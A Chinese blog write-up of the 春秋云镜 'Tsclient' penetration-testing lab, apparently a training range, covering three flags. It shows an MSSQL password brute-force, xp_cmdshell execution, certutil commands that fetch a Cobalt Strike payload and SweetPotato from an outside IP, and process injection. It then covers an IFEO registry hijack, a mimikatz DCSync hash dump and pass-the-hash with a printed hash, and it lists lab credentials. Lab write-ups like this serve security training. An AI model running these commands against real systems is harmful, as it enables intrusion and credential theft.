# 春秋云镜-Tsclient

  
  
&lt;!--more--&gt;  
## flag01  
`39.99.133.30`  
只给了一个`IP`，利用`fscan`扫描，  
可以爆破出账号和密码`sa/1qaz!QAZ`，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162259491.png)
利用`MDUT`进行攻击，利用开启`xp_cmdshell`进行`RCE`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162307264.png)
存在`SeImpersonatePrivilege`权限，可以进行脏土豆进行提权  
`certutil -urlcache -split -f http://8.137.71.171:8809/artifact.exe C:\Users\Public\a.exe`  
上传CS进行操作  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162332926.png)
脏土豆提权  
`certutil -urlcache -split -f http://8.137.71.171:8809/SweetPotato-new.exe C:\Users\Public\s.exe`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162344454.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162346560.png)
`flag{f8d4772e-3b4d-4d1d-8454-091b5904c6c0}`，还有`hint`  
`Maybe you should focus on user sessions...`  
## flag02  
上线一个最高权限的用户`C:\Users\Public\s.exe -a &#34;C:\Users\Public\a.exe&#34;`  
查看在线用户  
`shell query user`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162349969.png)
直接注入一个`john`用户的进程，获得一个`john`用户的权限  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162351772.png)
`shell net use`查看到与其他主机的连接  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162352680.png)
`shell dir \\TSCLIENT\C`查看远程目录，发现`credential.txt`  
`shell type \\TSCLIENT\C\credential.txt`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504162354601.png)
获得了账号和密码`xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#`，还有`hint`  
`Do you know how to hijack Image?`  
添加一个用户，连接3389  
```  
shell net user huahua 123@qwer! /add  
shell net localgroup administrators huahua /add  
```  
上传`fscan`开扫，  
```  
C:\Users\huahua\Desktop&gt;fscan.exe -h 172.22.8.18/24  
  
   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __  
 / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /  
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  
\____/     |___/\___|_|  \__,_|\___|_|\_\  
                     fscan version: 1.8.3  
start infoscan  
trying RunIcmp2  
The current user permissions unable to send icmp packets  
start ping  
(icmp) Target 172.22.8.46     is alive  
(icmp) Target 172.22.8.15     is alive  
(icmp) Target 172.22.8.18     is alive  
(icmp) Target 172.22.8.31     is alive  
[*] Icmp alive hosts len is: 4  
172.22.8.18:1433 open  
172.22.8.31:445 open  
172.22.8.15:445 open  
172.22.8.46:445 open  
172.22.8.18:445 open  
172.22.8.31:139 open  
172.22.8.15:139 open  
172.22.8.46:139 open  
172.22.8.31:135 open  
172.22.8.18:139 open  
172.22.8.15:135 open  
172.22.8.46:135 open  
172.22.8.18:135 open  
172.22.8.46:80 open  
172.22.8.18:80 open  
172.22.8.15:88 open  
[*] alive ports len is: 16  
start vulscan  
[*] NetInfo  
[*]172.22.8.31  
   [-&gt;]WIN19-CLIENT  
   [-&gt;]172.22.8.31  
[*] NetInfo  
[*]172.22.8.46  
   [-&gt;]WIN2016  
   [-&gt;]172.22.8.46  
[*] NetBios 172.22.8.15     [&#43;] DC:XIAORANG\DC01  
[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT  
[*] NetInfo  
[*]172.22.8.18  
   [-&gt;]WIN-WEB  
   [-&gt;]172.22.8.18  
   [-&gt;]2001:0:348b:fb58:304e:318a:d89c:7ae1  
[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server  
[*] NetInfo  
[*]172.22.8.15  
   [-&gt;]DC01  
   [-&gt;]172.22.8.15  
[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393  
[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server  
[&#43;] mssql 172.22.8.18:1433:sa 1qaz!QAZ  
已完成 16/16  
[*] 扫描结束,耗时: 10.0026477s  
```  
上传拿到一个域内用户的账号和密码，所以目标很明确，直接打`pth`  
```  
(icmp) Target 172.22.8.46     is alive WIN2016.xiaorang.lab  
(icmp) Target 172.22.8.15     is alive XIAORANG\DC01  
(icmp) Target 172.22.8.18     is alive hacker  
(icmp) Target 172.22.8.31     is alive WIN19-CLIENT  
```  
先打域内的机器`172.22.8.46`和`172.22.8.15`，域控无法连接  
直接上传`frp`，`3389`连接，这里需要修改密码  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504170016804.png)
根据`hint`是映像劫持提权  
查看权限  
```  
get-acl -path &#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&#34;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504170019412.png)
所有用户都可以修改注册表，所以这里直接改即可。  
```  
REG ADD &#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34; /v Debugger /t REG_SZ /d &#34;C:\windows\system32\cmd.exe&#34;  
```  
在登陆账户界面选择放大镜  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504170022875.png)
劫持成功，并成功提权。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504170022514.png)
`flag{b5ae73f0-9da7-471b-9b95-a5bc8656a7c7}`  
## flag03  
`172.22.8.46`不出网，在CS做一层代理上线  
成功上线  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504170031068.png)
这里直接打`DCSync`dump administrator的hash  
`shell C:\\Users\\Aldrich\\Desktop\\mimikatz.exe &#34;privilege::debug&#34; &#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34; &#34;exit&#34;`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504170044300.png)
直接`pth`  
`python3 wmiexec.py xiaorang.lab/Administrator@172.22.8.15 -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504170045115.png)
`flag{de7ad04b-823b-434c-820c-545f08e19ac0}`  
  
  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient/  

